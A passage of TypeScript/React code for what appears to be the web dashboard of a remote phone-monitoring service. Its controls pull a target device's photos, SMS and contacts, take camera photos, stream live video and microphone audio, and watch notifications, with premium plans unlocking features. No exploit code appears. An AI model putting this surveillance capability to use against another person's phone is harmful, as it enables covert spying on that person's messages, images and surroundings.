        return smsList.filter(sms =>
            sms.address?.toLowerCase().includes(query) ||
            sms.body?.toLowerCase().includes(query)
        );
    }, [smsList, smsSearchQuery]);

    // Filtered Contacts based on search
    const filteredContacts = useMemo(() => {
        if (!contactsSearchQuery) return contactsList;
        const query = contactsSearchQuery.toLowerCase();
        return contactsList.filter(contact => {
            const nameMatch = contact.name?.toLowerCase()?.includes(query) || false;
            const phoneMatch = contact.phones?.some((p: any) => {
                // Handle both string and object phone entries
                const phoneStr = typeof p === 'string' ? p : (p?.number || p?.value || String(p));
                return phoneStr?.toLowerCase()?.includes(query) || false;
            }) || false;
            return nameMatch || phoneMatch;
        });
    }, [contactsList, contactsSearchQuery]);


    const triggerUpload = (count: number | 'all') => {
        if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
            const payload = {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId,
                folderId: selectedFolder.id,
                folderName: selectedFolder.name,
                count: count,
                mediaType: syncMediaType
            };
            socket.emit("trigger_sync", payload);
            setIsStartingSync(true); // Start loading animation
            setSelectedFolder(null);
            setSyncMediaType(null);
        } else {
            console.error('[triggerUpload] Missing required data:', {
                hasSocket: !!socket,
                hasFolder: !!selectedFolder,
                hasMediaType: !!syncMediaType,
                hasUUID: !!session?.user?.uuid,
                hasDevice: !!selectedDeviceId
            });
        }
    };

    // --- Torch Functions ---
    const toggleTorch = () => {
        // Plan check - Torch requires Standard or Premium
        if (!planLimits.torch) {
            showUpgradePrompt('Flashlight Control', 'standard');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            alert("Please select an online device first.");
            return;
        }

        const newState = !isTorchOn;
        setIsTorchOn(newState);

        socket.emit("torch_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            on: newState,
            aggressive: torchAggressive,
            duration: torchDuration
        });
    };

    // --- Vibration Functions ---
    const triggerVibration = () => {
        // Plan check - Vibration requires Standard or Premium
        if (!planLimits.vibration) {
            showUpgradePrompt('Vibration Control', 'standard');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            alert("Please select an online device first.");
            return;
        }

        socket.emit("vibrate_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: vibrationDuration
        });
    };

    // --- Live Audio Functions ---
    const startLiveAudio = useCallback(() => {
        if (userPlan !== 'premium') {
            showUpgradePrompt('Live Audio Listening', 'premium');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
            setShowCustomAlert(true);
            return;
        }

        // AudioContext will be auto-created when first live_audio chunk arrives.
        // Just tell the device to start sending audio.
        socket.emit('start_live_audio', {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            gainBoost: false
        });
        setIsLiveAudio(true);
        isLiveAudioRef.current = true;
        setAudioError(null);
        setAudioElapsed(0);
        audioTimerRef.current = setInterval(() => {
            setAudioElapsed(prev => prev + 1);
        }, 1000);
    }, [socket, selectedDeviceId, session, userPlan]);

    const stopLiveAudio = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('stop_live_audio', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }

        // Cleanup timer
        if (audioTimerRef.current) {
            clearInterval(audioTimerRef.current);
            audioTimerRef.current = null;
        }

        // Cleanup visualizer
        if (audioAnimFrameRef.current) {
            cancelAnimationFrame(audioAnimFrameRef.current);
            audioAnimFrameRef.current = 0;
        }

        // Cleanup ScriptProcessorNode
        try {
            audioProcessorRef.current?.disconnect();
        } catch (e) { /* ignore */ }
        audioProcessorRef.current = null;

        // Cleanup AudioContext
        try {
            audioContextRef.current?.close();
        } catch (e) { /* ignore */ }
        audioContextRef.current = null;
        audioGainRef.current = null;
        audioAnalyserRef.current = null;

        // Reset ring buffer
        audioRingWriteRef.current = 0;
        audioRingReadRef.current = 0;
        audioRingSamplesRef.current = 0;

        setIsLiveAudio(false);
        isLiveAudioRef.current = false;
        setAudioLevel(0);
        setAudioElapsed(0);
    }, [socket, selectedDeviceId, session]);

    // --- Voice Recording Functions ---
    const startVoiceRecording = useCallback(() => {
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
            setShowCustomAlert(true);
            return;
        }
        socket.emit('start_voice_recording', {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: voiceRecDuration
        });
        setIsVoiceRecording(true);
        setVoiceRecProgress({ current: 0, total: voiceRecDuration });

        // Local progress timer
        let elapsed = 0;
        voiceRecTimerRef.current = setInterval(() => {
            elapsed++;
            setVoiceRecProgress(prev => ({ ...prev, current: elapsed }));
            if (elapsed >= voiceRecDuration) {
                clearInterval(voiceRecTimerRef.current!);
                voiceRecTimerRef.current = null;
            }
        }, 1000);
    }, [socket, selectedDeviceId, session, voiceRecDuration]);

    const stopVoiceRecording = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('stop_voice_recording', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
        setIsVoiceRecording(false);
        setVoiceRecProgress({ current: 0, total: 0 });
        if (voiceRecTimerRef.current) {
            clearInterval(voiceRecTimerRef.current);
            voiceRecTimerRef.current = null;
        }
    }, [socket, selectedDeviceId, session]);

    // Update gain when volume/mute changes
    useEffect(() => {
        if (audioGainRef.current) {
            audioGainRef.current.gain.value = isMuted ? 0 : audioVolume / 100;
        }
    }, [audioVolume, isMuted]);

    // Format seconds to MM:SS
    const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;

    // --- Gallery Logic ---

    const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);

    const filteredImages = useMemo(() => {
        if (activeTab === 'all') return images;
        return images.filter(img => img.resource_type === activeTab);
    }, [images, activeTab]);

    const toggleSelection = (id: string) => {
        const newSelection = new Set(selectedItems);
        if (newSelection.has(id)) {
            newSelection.delete(id);
        } else {
            newSelection.add(id);
        }
        setSelectedItems(newSelection);
        if (newSelection.size === 0) setIsSelectionMode(false);
        else setIsSelectionMode(true);
    };

    const selectAll = () => {
        if (selectedItems.size === filteredImages.length) {
            setSelectedItems(new Set());
            setIsSelectionMode(false);
        } else {
            setSelectedItems(new Set(filteredImages.map(img => img.id)));
            setIsSelectionMode(true);
        }
    };

    const deleteSelected = async () => {
        if (!confirm("Are you sure you want to delete these items?")) return;
        setIsDeleting(true);
        const idsToDelete = Array.from(selectedItems);

        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ids: idsToDelete })
            });

            if (response.ok) {
                setImages(prev => prev.filter(img => !selectedItems.has(img.id)));
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Delete failed", error);
        } finally {
            setIsDeleting(false);
        }
    };

    const downloadSelected = async () => {
        const selectedUrls = images.filter(img => selectedItems.has(img.id)).map(img => img.url);
        if (selectedUrls.length === 0) return;

        // If only 1 file is selected, download it directly instead of making a ZIP
        if (selectedUrls.length === 1) {
            const singleFileUrl = selectedUrls[0];
            const fileExt = singleFileUrl.split('.').pop()?.split('?')[0] || 'file';
            downloadSingle(singleFileUrl, `gallery_eye_${Date.now()}.${fileExt}`);
            setSelectedItems(new Set());
            setIsSelectionMode(false);
            return;
        }

        setIsDownloading(true);
        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls: selectedUrls })
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `gallery_download_${new Date().toISOString()}.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Download failed", error);
        } finally {
            setIsDownloading(false);
        }
    };

    const downloadSingle = async (url: string, filename: string) => {
        try {
            // Proxies the Cloudflare R2 fetch through the Next.js API to set 'Content-Disposition: attachment'
            // This forces the browser to download the file directly instead of opening it in a new tab due to cross-origin limitations.
            const proxyUrl = `/api/download?url=${encodeURIComponent(url)}&filename=${encodeURIComponent(filename)}`;
            
            const link = document.createElement('a');
            link.href = proxyUrl;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error("Download failed", error);
            window.open(url, '_blank');
        }
    };

    // Download SMS as CSV
    const downloadSmsAsCsv = () => {
        if (smsList.length === 0) return;

        const headers = ['Address', 'Body', 'Date', 'Type'];
        const csvContent = [
            headers.join(','),
            ...smsList.map(sms => [
                `"${(sms.address || '').replace(/"/g, '""')}"`,
                `"${(sms.body || '').replace(/"/g, '""')}"`,
                new Date(sms.date).toISOString(),
                sms.type === 1 ? 'Received' : 'Sent'
            ].join(','))
        ].join('\n');

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `sms_backup_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Download Contacts as vCard
    const downloadContactsAsVcf = () => {
        if (contactsList.length === 0) return;

        const vcards = contactsList.map(contact => {
            const name = contact.name || 'Unknown';
            const phones = contact.phones?.map((p: any) => {
                const num = typeof p === 'string' ? p : (p?.number || p?.value || '');
                return `TEL:${num}`;
            }).join('\n') || '';
            const emails = contact.emails?.map((e: any) => {
                const email = typeof e === 'string' ? e : (e?.address || e?.value || '');
                return `EMAIL:${email}`;
            }).join('\n') || '';

            return `BEGIN:VCARD
VERSION:3.0
FN:${name}
N:${name};;;
${phones}
${emails}
END:VCARD`;
        }).join('\n');

        const blob = new Blob([vcards], { type: 'text/vcard;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `contacts_backup_${new Date().toISOString().split('T')[0]}.vcf`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    if (status === "loading") {
        return (
            <div className="min-h-[100dvh] flex items-center justify-center" style={{ background: 'var(--bg-base)' }}>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '1.25rem' }}>
                    <div style={{
                        width: 48, height: 48, borderRadius: '50%',
                        border: '2px solid rgba(16,185,129,0.2)',
                        borderTopColor: 'var(--accent)',
                        animation: 'spin 1s linear infinite',
                    }} />
                    <span style={{ color: 'var(--text-muted)', fontSize: '0.875rem' }}>Loadingâ€¦</span>
                </div>
            </div>
        );
    }

    if (status === "unauthenticated") return null;

    const onlineDeviceCount = devices.filter(d => d.online).length;

    // Helper to render tools
    const renderTool = () => {
        if (!selectedDeviceId && devices.filter(d => d.online).length === 0) {
            return (
                <div className="flex flex-col items-center justify-center min-h-[60vh] text-center">
                    <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="max-w-md space-y-6">
                        <div className="w-24 h-24 mx-auto rounded-3xl bg-white/5 border border-white/10 flex items-center justify-center shadow-2xl">
                            <Smartphone size={48} className="text-white/20" />
                        </div>
                        <div>
                            <h2 className="text-2xl font-bold tracking-tight mb-2">No Devices Connected</h2>
                            <p className="text-white/40">Select a device from the top menu, or click 'Build App' to generate a new APK.</p>
                        </div>
                    </motion.div>
                </div>
            );
        }

        switch (selectedTool) {
            case 'gallery':
                return (
                    <div className="space-y-6">
                        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                            <div>
                                <h2 className="text-2xl font-bold tracking-tight">Gallery Sync</h2>
                                <p className="text-sm text-white/40">Browse and manage media files remotely.</p>
                            </div>
                            <div className="flex flex-wrap items-center gap-2">
                                <button onClick={fetchFolders} disabled={!selectedDeviceId} className="btn-secondary">
                                    <RefreshCw size={16} /> Refresh
                                </button>
                                {isSelectionMode && (
                                    <>
                                        <button onClick={downloadSelected} disabled={isDownloading} className="btn-primary">
                                            <Download size={16} /> {isDownloading ? 'Downloading...' : 'Download'}
                                        </button>
                                        <button onClick={deleteSelected} disabled={isDeleting} className="btn-secondary text-red-400 hover:text-red-300 border-red-400/20 hover:bg-red-400/10">
                                            <Trash2 size={16} /> {isDeleting ? 'Deleting...' : 'Delete'}
                                        </button>
                                    </>
                                )}
                            </div>
                        </div>

                        {!selectedFolder && folders.length > 0 && (
                            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                                {folders.map((folder: any, i: number) => (
                                    <motion.button 
                                        key={i}
                                        whileHover={{ scale: 1.02 }}
                                        whileTap={{ scale: 0.98 }}
                                        onClick={() => handleFolderClick(folder)}
                                        className="p-5 rounded-2xl bezel bezel-inner flex flex-col gap-4 text-left transition-colors hover:border-emerald-500/50 group"
                                    >
                                        <div className="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center group-hover:bg-emerald-500/20 transition-colors">
                                            <ImageIcon size={24} className="text-emerald-400" />
                                        </div>
                                        <div>
                                            <h3 className="font-semibold truncate text-white">{folder.name}</h3>
                                            <p className="text-xs text-white/40 mt-1 font-data">{folder.count || 0} items</p>
                                        </div>
                                    </motion.button>
                                ))}
                            </div>
                        )}

                        {selectedFolder && (
                            <div className="p-6 rounded-2xl bezel bezel-inner mb-6 relative overflow-hidden">
                                <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 blur-[80px] pointer-events-none rounded-full" />
                                <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
                                    <div className="flex items-center gap-3">
                                        <button onClick={() => setSelectedFolder(null)} className="p-2 rounded-lg bg-white/5 hover:bg-white/10 transition-colors">
                                            <ChevronDown size={20} className="rotate-90" />
                                        </button>
                                        <h3 className="text-xl font-bold tracking-tight">{selectedFolder.name}</h3>
                                    </div>
                                    {syncMediaType && (
                                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-wrap gap-2 w-full md:w-auto">
                                            <button onClick={() => triggerUpload(5)} className="btn-secondary text-xs py-1.5 px-3">Sync 5</button>
                                            <button onClick={() => triggerUpload(20)} className="btn-secondary text-xs py-1.5 px-3">Sync 20</button>
                                            <button onClick={() => triggerUpload(50)} className="btn-secondary text-xs py-1.5 px-3">Sync 50</button>
                                            <button onClick={() => {
                                                setSyncOptionsFolder({ name: selectedFolder.name, count: selectedFolder.count, type: syncMediaType });
                                                setShowSyncOptionsModal(true);
                                            }} className="btn-primary text-xs py-1.5 px-3 ml-auto md:ml-0">Sync All</button>
                                        </motion.div>
                                    )}
                                </div>
                                <div className="flex items-center gap-4 relative z-10">
                                    <button onClick={() => setSyncMediaType('image')} className={`flex-1 p-4 rounded-xl border ${syncMediaType === 'image' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-white/5 border-white/10 hover:bg-white/10'} transition-all`}>
                                        <ImageIcon size={24} className="mx-auto mb-2" />
                                        <div className="text-center font-medium">Photos</div>
                                    </button>
                                    <button onClick={() => setSyncMediaType('video')} className={`flex-1 p-4 rounded-xl border ${syncMediaType === 'video' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-white/5 border-white/10 hover:bg-white/10'} transition-all`}>
                                        <Video size={24} className="mx-auto mb-2" />
                                        <div className="text-center font-medium">Videos</div>
                                    </button>
                                </div>
                            </div>
                        )}

                        <div className="flex flex-wrap items-center gap-2 mb-4">
                            {(['all', 'image', 'video'] as const).map(tab => (
                                <button key={tab} onClick={() => setActiveTab(tab)} className={`px-4 py-1.5 rounded-full text-sm font-medium transition-colors ${activeTab === tab ? 'bg-white text-black' : 'bg-white/10 text-white/60 hover:text-white'}`}>
                                    {tab.charAt(0).toUpperCase() + tab.slice(1)}s
                                </button>
                            ))}
                            <button onClick={selectAll} className="ml-auto flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm bg-white/5 hover:bg-white/10 transition-colors font-medium">
                                <CheckSquare size={16} /> Select All
                            </button>
                        </div>
                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
                            {filteredImages.map((img: any) => (
                                <div key={img.id} onClick={() => toggleSelection(img.id)} className={`relative aspect-square rounded-xl overflow-hidden cursor-pointer group border-2 transition-all ${selectedItems.has(img.id) ? 'border-emerald-400 scale-[0.97]' : 'border-transparent hover:border-white/20'}`}>
                                    {img.resource_type === 'video' ? (
                                        <video src={img.url} className="w-full h-full object-cover" />
                                    ) : (
                                        <img src={img.url} alt="Gallery" className="w-full h-full object-cover" loading="lazy" />
                                    )}
                                    <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                                        <button onClick={(e) => { e.stopPropagation(); setPreviewItem(img); }} className="p-3 rounded-full bg-white/20 backdrop-blur-md hover:bg-white/30 transition-colors">
                                            <Search size={20} className="text-white" />
                                        </button>
                                    </div>
                                    {selectedItems.has(img.id) && (
                                        <div className="absolute top-2 right-2 w-6 h-6 rounded-full bg-emerald-500 shadow-lg flex items-center justify-center animate-scaleIn">
                                            <Check size={14} className="text-black" />
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                        {galleryHasMore && <div ref={galleryLoaderRef} className="h-20 flex items-center justify-center"><div className="w-6 h-6 rounded-full border-2 border-emerald-500/30 border-t-emerald-500 animate-spin" /></div>}
                    </div>
                );
            case 'sms':
            case 'contacts':
                const isSms = selectedTool === 'sms';
                const items = isSms ? filteredSms : filteredContacts;
                const search = isSms ? smsSearchQuery : contactsSearchQuery;
                const setSearch = isSms ? setSmsSearchQuery : setContactsSearchQuery;
                const fetchFn = isSms ? fetchSms : fetchContacts;
                const isFetching = isSms ? isFetchingSms : isFetchingContacts;

                return (
                    <div className="space-y-6 h-full flex flex-col">
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4">
                            <div>
                                <h2 className="text-2xl font-bold tracking-tight">{isSms ? 'Messages' : 'Contacts'}</h2>
                                <p className="text-sm text-white/40">View and backup device {isSms ? 'SMS' : 'contacts'}.</p>
                            </div>
                            <div className="flex items-center gap-2">
                                <button onClick={fetchFn} disabled={!selectedDeviceId || isFetching} className="btn-primary">
                                    <RefreshCw size={16} className={isFetching ? "animate-spin" : ""} /> Sync {isSms ? 'SMS' : 'Contacts'}
                                </button>
                                {isSms ? (
                                    <button onClick={downloadSmsAsCsv} className="btn-secondary"><Download size={16}/> CSV</button>
                                ) : (
                                    <button onClick={downloadContactsAsVcf} className="btn-secondary"><Download size={16}/> vCard</button>
                                )}
                            </div>
                        </div>
                        <div className="relative flex-shrink-0">
                            <Search size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
                            <input 
                                type="text" 
                                placeholder="Search..." 
                                value={search}
                                onChange={(e) => setSearch(e.target.value)}
                                className="input-field pl-11 bg-white/5 border-white/10"
                            />
                        </div>
                        <div className="flex-1 overflow-y-auto bezel bezel-inner rounded-2xl p-2 scrollbar-hide">
                            <div className="flex flex-col gap-1">
                                {items.length === 0 ? (
                                    <div className="py-20 flex items-center justify-center text-white/40 font-medium">No items found. Click sync to fetch.</div>
                                ) : (
                                    items.map((item: any, i: number) => (
                                        <div key={i} className="p-4 rounded-xl bg-transparent hover:bg-white/5 transition-colors flex gap-4 border-b border-white/5 last:border-0">
                                            <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${isSms ? 'bg-sky-500/10 text-sky-400' : 'bg-indigo-500/10 text-indigo-400'}`}>
                                                {isSms ? <MessageSquare size={18} /> : <Users size={18} />}
                                            </div>
                                            <div className="flex-1 min-w-0 flex flex-col justify-center">
                                                <div className="flex items-center justify-between mb-0.5">
                                                    <h4 className="font-semibold truncate text-white/90 text-sm">{isSms ? item.address : item.name}</h4>
                                                    {isSms && <span className="text-xs text-white/40 font-data flex-shrink-0 ml-2">{new Date(item.date).toLocaleDateString()}</span>}
                                                </div>
                                                <p className="text-sm text-white/50 truncate">{isSms ? item.body : (item.phones?.[0]?.number || item.phones?.[0] || 'No number')}</p>
                                            </div>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>
                );
            case 'camera':
            case 'audio':
                const isCam = selectedTool === 'camera';
                return (
                    <div className="flex flex-col items-center justify-center min-h-[60vh] py-8">
                        <div className="w-full max-w-xl bezel bezel-inner rounded-[2.5rem] p-8 sm:p-12 text-center space-y-8 relative overflow-hidden">
                            <div className={`absolute top-[-20%] right-[-20%] w-[60%] h-[60%] blur-[100px] rounded-full pointer-events-none ${isCam ? 'bg-pink-500/20' : 'bg-amber-500/20'}`} />
                            <div className={`w-24 h-24 mx-auto rounded-[2rem] flex items-center justify-center shadow-2xl relative z-10 ${isCam ? 'bg-pink-500/10 text-pink-400 border border-pink-500/20' : 'bg-amber-500/10 text-amber-400 border border-amber-500/20'}`}>
                                {isCam ? <Camera size={40} /> : <Mic size={40} />}
                            </div>
                            <div className="relative z-10">
                                <h2 className="text-3xl font-bold tracking-tight mb-3">Live {isCam ? 'Camera' : 'Audio'} Feed</h2>
                                <p className="text-white/40 max-w-sm mx-auto text-sm leading-relaxed">Remotely trigger the device's {isCam ? 'camera to capture high-res photos or stream video' : 'microphone for live listening or background recording'}.</p>
                            </div>
                            <div className="flex flex-wrap items-center justify-center gap-3 relative z-10">
                                {isCam ? (
                                    <>
                                        <button 
                                            onClick={() => { setIsCapturingPhoto(true); socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); }}
                                            disabled={isCapturingPhoto}
                                            className="btn-primary py-3 px-6 rounded-xl bg-white/10 hover:bg-white/20 text-white shadow-none"
                                        >
                                            {isCapturingPhoto ? <RefreshCw className="animate-spin" size={18}/> : <Camera size={18} />}
                                            Capture Photo
                                        </button>
                                        <button 
                                            onClick={() => {
                                                if (isLiveStreaming) {
                                                    socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                    setIsLiveStreaming(false);
                                                } else {
                                                    socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
                                                    setIsLiveStreaming(true);
                                                }
                                            }}
                                            className={`btn-primary py-3 px-6 rounded-xl ${isLiveStreaming ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-emerald-500 hover:bg-emerald-600 shadow-lg shadow-emerald-500/20'}`}
                                        >
                                            {isLiveStreaming ? <Square size={18} /> : <Video size={18} />}
                                            {isLiveStreaming ? 'Stop Stream' : 'Live Stream'}
                                        </button>
                                        <button 
                                            onClick={() => {
                                                if (isRecording) {
                                                    socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                    setIsRecording(false);
                                                } else {
                                                    setIsRecording(true);
                                                    setRecordingProgress({ current: 0, total: recordingDuration });
                                                    socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                                }
                                            }}
                                            className={`btn-primary py-3 px-6 rounded-xl ${isRecording ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-pink-500 hover:bg-pink-600 shadow-lg shadow-pink-500/20'}`}
                                        >
                                            {isRecording ? <Square size={18} /> : <Video size={18} />}
                                            {isRecording ? 'Stop Recording' : 'Record Video'}
                                        </button>
                                    </>
                                ) : (
                                    <>
                                        <button 
                                            onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
                                            className={`btn-primary py-3 px-6 rounded-xl ${isLiveAudio ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-amber-500 hover:bg-amber-600 shadow-lg shadow-amber-500/20'}`}
                                        >
                                            {isLiveAudio ? <Square size={18} /> : <Play size={18} />}
                                            {isLiveAudio ? 'Stop Live Listening' : 'Live Listen'}
                                        </button>
                                        <button 
                                            onClick={isVoiceRecording ? stopVoiceRecording : startVoiceRecording}
                                            className={`btn-secondary py-3 px-6 rounded-xl ${isVoiceRecording ? 'text-red-400 border-red-400/50 hover:bg-red-500/10' : ''}`}
                                        >
                                            {isVoiceRecording ? <Square size={18} /> : <Mic size={18} />}
                                            {isVoiceRecording ? 'Stop Recording' : 'Record Voice'}
                                        </button>
                                    </>
                                )}
                            </div>
                            
                            {isLiveAudio && (
                                <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="mt-8 p-6 rounded-2xl bg-black/40 border border-white/5 flex flex-col items-center gap-4 relative z-10 w-full">
                                    <div className="flex items-center gap-2 bg-red-500/10 px-3 py-1 rounded-full border border-red-500/20">
                                        <div className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse shadow-[0_0_12px_rgba(239,68,68,0.8)]" />
                                        <span className="text-xs font-bold text-red-400 font-data tracking-wider uppercase">Live • {formatTime(audioElapsed)}</span>
                                    </div>
                                    <div className="flex items-center justify-center gap-1.5 h-16 w-full px-4">
                                        {Array.from({length: 24}).map((_, i) => (
                                            <div 
                                                key={i} 
                                                className="w-1.5 bg-amber-400 rounded-full transition-all duration-75"
                                                style={{ height: `${Math.max(15, audioLevel * 100 * Math.random())}%`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
                                            />
                                        ))}
                                    </div>
                                </motion.div>
                            )}

                            {isCam && isLiveStreaming && liveFrame && (
                                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mt-8 rounded-2xl overflow-hidden border border-white/10 aspect-[3/4] sm:aspect-video relative bg-black shadow-2xl relative z-10 w-full">
                                    <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live Feed" />
                                    <div className="absolute top-4 right-4 flex items-center gap-2 bg-black/60 backdrop-blur-xl px-3 py-1.5 rounded-full border border-white/10 shadow-lg">
                                        <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                        <span className="text-xs font-bold text-white tracking-widest font-data">LIVE</span>
                                    </div>
                                </motion.div>
                            )}
                        </div>
                    </div>
                );
            case 'torch':
            case 'vibration':
                const isTorch = selectedTool === 'torch';
                return (
                    <div className="flex flex-col items-center justify-center min-h-[60vh]">
                        <div className="max-w-md w-full bezel bezel-inner rounded-[2.5rem] p-12 text-center space-y-12 relative overflow-hidden">
                            <div className={`absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/5 to-transparent pointer-events-none transition-opacity duration-500 ${isTorch && isTorchOn ? 'opacity-0' : 'opacity-100'}`} />
                            {isTorch && isTorchOn && <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full bg-yellow-400/20 blur-[100px] pointer-events-none" />}
                            
                            <div className="space-y-3 relative z-10">
                                <h2 className="text-3xl font-bold tracking-tight">{isTorch ? 'Flashlight' : 'Vibration'}</h2>
                                <p className="text-white/40 text-sm">Toggle the device's {isTorch ? 'flash LED' : 'haptic motor'} remotely.</p>
                            </div>
                            
                            <button 
                                onClick={isTorch ? toggleTorch : triggerVibration}
                                className={`relative w-48 h-48 mx-auto rounded-full flex items-center justify-center transition-all duration-500 ease-[cubic-bezier(0.34,1.56,0.64,1)] group z-10 ${
                                    isTorch && isTorchOn 
                                        ? 'bg-yellow-400 shadow-[0_0_80px_rgba(250,204,21,0.6),inset_0_-8px_20px_rgba(0,0,0,0.2)] scale-105' 
                                        : 'bg-gradient-to-b from-white/10 to-white/5 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.4),inset_0_1px_1px_rgba(255,255,255,0.2)] hover:scale-105'
                                }`}
                            >
                                <div className={`absolute inset-2 rounded-full border transition-colors duration-500 ${isTorch && isTorchOn ? 'border-yellow-300/50' : 'border-white/5 group-hover:border-white/10'}`} />
                                {isTorch ? (
                                    <Flashlight size={64} className={`transition-colors duration-500 ${isTorchOn ? 'text-yellow-900 drop-shadow-md' : 'text-yellow-400/80 group-hover:text-yellow-400'}`} />
                                ) : (
                                    <Vibrate size={64} className="text-orange-400/80 group-hover:text-orange-400 transition-colors" />
                                )}
                            </button>
                        </div>
                    </div>
                );
            case 'notifications':
                return (
                    <div className="space-y-6 h-full flex flex-col">
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4">
                            <div>
                                <h2 className="text-2xl font-bold tracking-tight">Alerts & Notifications</h2>
                                <p className="text-sm text-white/40">Monitor device push notifications.</p>
                            </div>
                            <div className="flex items-center gap-3 bg-white/5 px-4 py-2.5 rounded-xl border border-white/10">
                                <span className="text-sm font-medium text-white/80">Monitoring</span>
                                <button 
                                    onClick={() => socket?.emit('toggle_notification_monitor', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, enable: !isMonitoringNotifications })}
                                    className={`relative w-12 h-6 rounded-full transition-colors duration-300 ${isMonitoringNotifications ? 'bg-cyan-500' : 'bg-white/20'}`}
                                >
                                    <div className={`absolute top-1 left-1 w-4 h-4 rounded-full bg-white transition-transform duration-300 shadow-sm ${isMonitoringNotifications ? 'translate-x-6' : 'translate-x-0'}`} />
                                </button>
                            </div>
                        </div>
                        <div className="flex gap-2 overflow-x-auto scrollbar-hide pb-2 flex-shrink-0">
                            {notifAppFilters.map(filter => (
                                <button
                                    key={filter.key}
